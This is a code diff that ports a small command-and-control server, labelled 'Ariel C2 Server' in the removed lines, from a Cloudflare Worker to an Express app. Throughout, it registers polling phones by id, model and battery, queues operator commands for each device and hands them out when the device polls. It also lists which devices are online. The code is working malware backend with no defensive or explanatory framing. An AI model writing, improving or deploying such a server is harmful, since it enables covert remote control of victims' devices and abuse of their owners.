@@ -1,72 +1,51 @@
-export default {
-  async fetch(request, env, ctx) {
-    const url = new URL(request.url);
-    const path = url.pathname;
-    const corsHeaders = {
-      "Access-Control-Allow-Origin": "*",
-      "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
-      "Access-Control-Allow-Headers": "Content-Type",
-    };
+const express = require('express');
+const app = express();
+app.use(express.json());
 
-    if (request.method === "OPTIONS") return new Response(null, { headers: corsHeaders });
+app.use((req, res, next) => {
+    res.header("Access-Control-Allow-Origin", "*");
+    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
+    next();
+});
 
-    if (path === "/poll" && request.method === "GET") {
-      const id = url.searchParams.get("id");
-      const model = url.searchParams.get("model") || "Unknown";
-      const battery = url.searchParams.get("battery") || "0";
-      
-      if (id) {
-        if (!globalThis.devices) globalThis.devices = {};
-        if (!globalThis.commands) globalThis.commands = {};
-        
-        // Simpan data HP ke server
-        globalThis.devices[id] = { model, battery, last_seen: Date.now() };
+const devices = {};
+const commands = {};
 
-        // Kirim perintah jika ada
-        if (globalThis.commands[id] && globalThis.commands[id].length > 0) {
-          const cmd = globalThis.commands[id].shift();
-          return new Response(JSON.stringify({ cmd: cmd }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
-        }
-      }
-      return new Response("null", { headers: corsHeaders });
+app.get('/poll', (req, res) => {
+    const { id, model, battery } = req.query;
+    if (id) devices[id] = { model: model || "Unknown", battery: battery || "0", last_seen: Date.now() };
+    if (commands[id] && commands[id].length > 0) {
+        res.json({ cmd: commands[id].shift() });
+    } else {
+        res.json(null);
     }
+});
 
-    // Endpoint untuk ngecek satu ID spesifik
-    if (path === "/check" && request.method === "GET") {
-      const id = url.searchParams.get("id");
-      if (globalThis.devices && globalThis.devices[id]) {
-        const dev = globalThis.devices[id];
-        if (Date.now() - dev.last_seen < 15000) {
-          return new Response(JSON.stringify({ status: "online", model: dev.model, battery: dev.battery }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
-        }
-      }
-      return new Response(JSON.stringify({ status: "offline" }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+app.get('/devices', (req, res) => {
+    const now = Date.now();
+    const active = [];
+    for (let id in devices) {
+        if (now - devices[id].last_seen < 15000) active.push({ id, model: devices[id].model, battery: devices[id].battery });
     }
+    res.json(active);
+});
 
-    if (path === "/devices" && request.method === "GET") {
-      if (!globalThis.devices) globalThis.devices = {};
-      const now = Date.now();
-      const active = [];
-      for (let id in globalThis.devices) {
-        if (now - globalThis.devices[id].last_seen < 15000) {
-          active.push({ id: id, model: globalThis.devices[id].model, battery: globalThis.devices[id].battery });
-        } else {
-          delete globalThis.devices[id];
-        }
-      }
-      return new Response(JSON.stringify(active), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+app.get('/check', (req, res) => {
+    const id = req.query.id;
+    if (devices[id] && (Date.now() - devices[id].last_seen < 15000)) {
+        res.json({ status: "online", model: devices[id].model, battery: devices[id].battery });
+    } else {
+        res.json({ status: "offline" });
     }
+});
 
-    if (path === "/cmd" && request.method === "POST") {
-      const body = await request.json();
-      if (body.id && body.cmd) {
-        if (!globalThis.commands) globalThis.commands = {};
-        if (!globalThis.commands[body.id]) globalThis.commands[body.id] = [];
-        globalThis.commands[body.id].push(body.cmd);
-      }
-      return new Response("ok", { headers: corsHeaders });
+app.post('/cmd', (req, res) => {
+    const { id, cmd } = req.body;
+    if (id && cmd) {
+        if (!commands[id]) commands[id] = [];
+        commands[id].push(cmd);
     }
+    res.send("ok");
+});
 
-    return new Response("Ariel C2 Server Aktif", { headers: corsHeaders });
-  }
-};
+module.exports = app;
